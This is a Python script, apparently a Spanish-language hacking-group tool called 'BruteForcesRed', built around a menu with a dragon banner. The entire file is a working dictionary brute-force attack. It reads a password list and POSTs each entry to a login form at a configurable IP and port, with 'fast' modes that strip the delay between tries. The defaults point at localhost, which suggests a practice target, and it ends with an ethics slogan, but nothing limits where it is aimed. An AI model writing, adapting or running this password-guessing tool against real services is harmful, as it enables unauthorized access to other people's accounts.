import requests
import time
import os
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# ASCII Art de Dragón
dragon_logo = r"""
           __====-_  _-====__
         _--^^^#####//      \\#####^^^--_
      _-^##########// (    ) \\##########^-_
     -############//  |\^^/|  \\############-
   _/############//   (@::@)   \\############\_
  /#############((      \\//      ))#############\
 -###############\\     (oo)     //###############-
-#################\\    / "" \    //#################-
-###################\\  /     \  //###################-
-####################\\/       \\####################-
_#/|##########/\######(         )######/\##########|\#_
|/ |#/\#/\#/\/  \#/\##\       /##/\#/  \/\#/\#/\#\| \
   |/  V  |/     V  |         |  V     \|  V  |  \
"""

def limpiar_pantalla():
    os.system('clear' if os.name == 'posix' else 'cls')

def mostrar_menu():
    limpiar_pantalla()
    print(Fore.RED + "\n" + "BruteForcesRed".center(50, ' '))
    print(Fore.GREEN + dragon_logo)
    print(Fore.GREEN + "by red365\n")
    print(Fore.GREEN + "Menú:")
    print(Fore.GREEN + "1. Iniciar Brute Force")
    print(Fore.GREEN + "2. Iniciar RED FAST BRUTE FORCE")
    print(Fore.GREEN + "3. Ingresar contraseña manualmente")
    print(Fore.GREEN + "4. Ver diccionario de contraseñas")
    print(Fore.GREEN + "5. Instrucciones de uso")
    print(Fore.GREEN + "6. Usar otro diccionario")
    print(Fore.GREEN + "7. Cambiar IP (actual: {})".format(ip))
    print(Fore.GREEN + "8. Cambiar Puerto (actual: {})".format(puerto))
    print(Fore.GREEN + "9. Salir")

def ver_diccionario(diccionario):
    print(Fore.GREEN + "Contenido del diccionario:")
    try:
        with open(diccionario, 'r') as f:
            contras = f.readlines()
            for con in contras:
                print(Fore.GREEN + con.strip())
    except FileNotFoundError:
        print(Fore.RED + "No se encontró el diccionario.")
    input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada

def instrucciones():
    print(Fore.GREEN + "Instrucciones de Uso:")
    print(Fore.GREEN + "1. Asegúrate de tener el archivo 'diccionario.txt' en la misma carpeta que este script.")
    print(Fore.GREEN + "2. Selecciona 'Iniciar Brute Force' para comenzar el ataque.")
    print(Fore.GREEN + "3. Observa el progreso en la consola.")
    print(Fore.GREEN + "4. Puedes volver a intentar con otro diccionario o salir.")
    input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada

def iniciar_brute_force(diccionario, ip, puerto, velocidad=1):
    # URL de la página de inicio de sesión
    url = f"http://{ip}:{puerto}/"
    
    # Cargar contraseñas desde el diccionario
    try:
        with open(diccionario, 'r') as f:
            passwords = f.read().splitlines()  # Lee las contraseñas en una lista
    except FileNotFoundError:
        print(Fore.RED + "No se encontró el diccionario.")
        input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada
        return
    
    # Intentar cada contraseña en el diccionario
    for password in passwords:
        print(Fore.YELLOW + f"Probando contraseña: {password}...", end='')
        response = requests.post(url, data={"password": password})
        
        # Simular una animación de prueba
        time.sleep(velocidad)  # Esperar según la velocidad especificada
        
        if "¡Acceso concedido!" in response.text:
            print(Fore.GREEN + f" ✓ Contraseña encontrada: {password}")
            input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada
            return
        else:
            print(Fore.RED + f" X Contraseña incorrecta: {password}")
    
    print(Fore.RED + "No se encontró ninguna contraseña en el diccionario.")
    input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada

def iniciar_fast_brute_force(diccionario, ip, puerto):
    print(Fore.GREEN + "Selecciona la velocidad:")
    print(Fore.GREEN + "1. 2x (rápido)")
    print(Fore.GREEN + "2. 3x (muy rápido)")
    print(Fore.GREEN + "3. 4x (ultra rápido)")
    print(Fore.GREEN + "4. Sin pausa (máxima velocidad)")
    velocidad_opcion = input(Fore.GREEN + "Selecciona una opción (1-4): ")
    
    if velocidad_opcion == '1':
        iniciar_brute_force(diccionario, ip, puerto, velocidad=0.5)  # Velocidad rápida
    elif velocidad_opcion == '2':
        iniciar_brute_force(diccionario, ip, puerto, velocidad=0.33)  # Muy rápido
    elif velocidad_opcion == '3':
        iniciar_brute_force(diccionario, ip, puerto, velocidad=0.25)  # Ultra rápido
    elif velocidad_opcion == '4':
        iniciar_brute_force(diccionario, ip, puerto, velocidad=0)  # Sin pausa
    else:
        print(Fore.RED + "Opción no válida. Se usará velocidad predeterminada.")
        iniciar_brute_force(diccionario, ip, puerto)

def ingresar_contraseña_manual(ip, puerto):
    password = input(Fore.GREEN + "Introduce la contraseña a probar: ")
    url = f"http://{ip}:{puerto}/"
    print(Fore.YELLOW + f"Probando contraseña: {password}...", end='')
    response = requests.post(url, data={"password": password})
    
    if "¡Acceso concedido!" in response.text:
        print(Fore.GREEN + f" ✓ Contraseña encontrada: {password}")
    else:
        print(Fore.RED + f" X Contraseña incorrecta: {password}")
    
    input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada

def usar_otro_diccionario():
    diccionario = input(Fore.GREEN + "Introduce el nombre del diccionario (debe estar en la misma carpeta): ")
    return diccionario

def cambiar_ip():
    nueva_ip = input(Fore.GREEN + "Introduce la nueva IP: ")
    print(Fore.GREEN + f"IP cambiada a: {nueva_ip}")
    return nueva_ip

def cambiar_puerto():
    nuevo_puerto = input(Fore.GREEN + "Introduce el nuevo puerto: ")
    print(Fore.GREEN + f"Puerto cambiado a: {nuevo_puerto}")
    return nuevo_puerto

def main():
    global diccionario
    global ip
    global puerto
    diccionario = 'diccionario.txt'  # Diccionario predeterminado
    ip = '127.0.0.1'  # IP predeterminada
    puerto = '5000'  # Puerto predeterminado

    while True:
        mostrar_menu()
        opcion = input(Fore.GREEN + "Selecciona una opción: ")
        
        if opcion == '1':
            iniciar_brute_force(diccionario, ip, puerto)
        elif opcion == '2':
            iniciar_fast_brute_force(diccionario, ip, puerto)
        elif opcion == '3':
            ingresar_contraseña_manual(ip, puerto)
        elif opcion == '4':
            ver_diccionario(diccionario)
        elif opcion == '5':
            instrucciones()
        elif opcion == '6':
            diccionario = usar_otro_diccionario()
        elif opcion == '7':
            ip = cambiar_ip()
        elif opcion == '8':
            puerto = cambiar_puerto()
        elif opcion == '9':
            print(Fore.GREEN + "Saliendo...")
            print(Fore.BLUE + "The Termux Syndicate - \"EXPLORAMOS CON ÉTICA, PROTEGEMOS CON UNIDAD\"")
            break
        else:
            print(Fore.RED + "Opción no válida. Inténtalo de nuevo.")
            input(Fore.YELLOW + "\nPresiona Enter para volver al menú...")  # Esperar entrada

if __name__ == "__main__":
    main()
